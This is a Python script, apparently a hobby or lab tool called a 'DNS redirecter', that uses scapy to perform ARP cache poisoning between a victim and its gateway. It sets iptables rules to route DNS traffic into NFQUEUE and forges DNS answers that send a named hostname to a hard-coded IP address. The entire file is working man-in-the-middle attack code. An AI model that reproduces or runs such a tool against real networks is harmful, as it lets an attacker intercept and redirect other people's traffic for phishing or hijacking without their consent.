#!/usr/bin/python3
import matplotlib
import threading
matplotlib.use('Agg')

from scapy.all import *
from netfilterqueue import NetfilterQueue
import time
import os
import sys

def get_mac(ip):

    # create an Ether()/ARP() packet
    arppkt = Ether()/ARP()

    # broadcast: who is at this ip? (what is their mac address?)
    # op code auto set to 1 (ARP request)
    arppkt[ARP].pdst=ip
    arppkt[ARP].hwdst="ff:ff:ff:ff:ff:ff"
    arppkt[Ether].dst="ff:ff:ff:ff:ff:ff"

    # send the packet and record the response
    answer = srp1(arppkt, timeout=2, verbose=False, inter=0.1)

    if answer:
        # print("\tIP: {:15}\tMAC: {:17}".format(ip,answer.hwsrc))
        print("\tIP: {:15}".format(ip))
        return answer.hwsrc # if a response was received, return mac addr
    else:
        print("\tCould not find MAC address for {ip}.")
        print("\x1b[1;31m[+] \x1b[0mExiting...")
        sys.exit(0)


def create_arp_packet(t_ip,t_mac,s_ip,s_mac=None):

    # craft an unsolicited ARP reply
    packet = Ether()/ARP()

    # the packet is directed to the target ip/mac:
    # 1.) it appears to be from the spoof ip
    # 2.) but it contains our mac address instead
    # 3.) this associates our mac with the spoof ip in the target's ARP table
    
    packet[Ether].dst = t_mac
    packet[ARP].op = 2 # set op code = ARP reply
    packet[ARP].hwdst = t_mac
    packet[ARP].pdst = t_ip
    
    # the packet has our mac address if s_mac=None
    if s_mac is not None:
        packet[ARP].hwsrc = s_mac
        
    packet[ARP].psrc = s_ip

    return packet

def poison(pkt1,pkt2,iface):
    
    # enable ip forwarding so the packets are forwarded

    print('\x1b[1;31m[+] \x1b[0mPoisoning...')
    
    try:
        while True:
            sendp([pkt1, pkt2], verbose=False, iface=iface) # send on Layer 2
            time.sleep(1) # wait 10s
    except KeyboardInterrupt:
            print("\n\x1b[1;31m[+] \x1b[0mTerminating program...")
            print("\tARP poisoning stopped.")
            return None

def restore(res1,res2):
    
    # disable ip forwarding
    os.system("sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
    
    # restore iptables 
    os.system("iptables -F")
    os.system("iptables -X")
    os.system("iptables -t nat -F")
    os.system("iptables -t nat -X")
    
    # reARP
    print('\tRE-ARPing...')
    sendp([res1,res2], verbose=False)
    
    # exit!
    print("\x1b[1;31m[+] \x1b[0mExiting...")
    sys.exit(0)
    
def usage():
    print("usage: ./arp-psn <victim ip> <gateway ip>")
    sys.exit(0)

#Get the mac address of the attacking interface
def get_attack_mac(iface):
    try:
        return get_if_hwaddr(iface)
    except:
        print("\tCould not find MAC address for " + iface + ".")
        print("\x1b[1;31m[+] \x1b[0mExiting...")
        sys.exit(0)


def redirect_dns(hostnames, redirect_ip, target_ip, target_mac):
    def callback(packet):
        pkt = IP(packet.get_payload())

        if not pkt.haslayer(DNSQR):
            packet.accept()
            return
        
        qname = pkt.qd.qname.decode()
        # Packet was not addressed to a hostnames address, continue as normal
        if qname not in hostnames:
            packet.accept()
            return

        print("\nGot Query for " + str(qname) + "\n")

        # Create a response packet to redirect the dns request to a different IP address
        resp_packet = IP() / UDP() / DNS()

        # Set up the IP part of the response packet
        resp_packet[IP].src=pkt[IP].dst
        resp_packet[IP].dst=pkt[IP].src

        # Set up the UDP part of the response packet
        resp_packet[UDP].sport=pkt[UDP].dport
        resp_packet[UDP].dport=pkt[UDP].sport

        # Set up the DNS part of the response packet
        resp_packet[DNS].qr=1
        resp_packet[DNS].aa=1
        resp_packet[DNS].id=pkt[DNS].id
        resp_packet[DNS].qd=pkt[DNS].qd
        resp_packet[DNS].an=DNSRR(ttl=10,rdata=redirect_ip,rrname=qname)

        packet.set_payload(bytes(resp_packet))
        packet.accept()

    # Set up net filter queue to scan internet packets for the redirect address
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, callback)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        print("cleaning up")
        nfqueue.unbind()		

def main(target_ip, gateway_ip, iface):

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    # get mac address of attacker
    attack_mac = get_attack_mac(iface)

    # set up system commands to allow for our rerouting
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1 -i " + iface)
    os.system("iptables -A FORWARD -o " + iface + " -j ACCEPT")
    os.system("iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i " + iface + " -j ACCEPT")

    # create malicious packets
    pkt1 = create_arp_packet(target_ip,target_mac,gateway_ip)
    pkt2 = create_arp_packet(gateway_ip,gateway_mac,target_ip)

    # create reARPing packets
    res1 = create_arp_packet(target_ip,target_mac,gateway_ip,gateway_mac)
    res2 = create_arp_packet(gateway_ip,gateway_mac,target_ip,target_mac)

    # Web addresses we want to redirect
    hostnames = ["padraig.io."]

    # IP address to redirect to when a website from hostnames is called
    #redirect_ip = "192.168.1.101"
    redirect_ip = "104.236.86.11"
    #redirect_ip = "204.197.0.157"

    
    try:
        # enable ip forwarding and ARP poison until Ctrl+C
        poison_thread = threading.Thread(
            target=poison,
            args=(pkt1,pkt2,iface),
            daemon=True
        )
        dns_thread = threading.Thread(
            target=redirect_dns,
            args=(hostnames,redirect_ip,target_ip,target_mac),
            daemon=True
        )
        # Start and join all threads
        poison_thread.start()
        dns_thread.start()
        poison_thread.join()
        dns_thread.join()
    except KeyboardInterrupt:
        # reARP and disable ip forwarding
        restore(res1,res2)

if __name__ == '__main__':
    
    if len(sys.argv) < 3:
        usage()

    print('\n---------- \x1b[1;31mDNS redirecter\x1b[0m ----------')
    print("\x1b[1;31m[+] \x1b[0mGathering data on victims...")

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    # Interface to read packets from
    #iface = sys.argv[3]
    iface = "wlan0"

    main(target_ip, gateway_ip, iface)

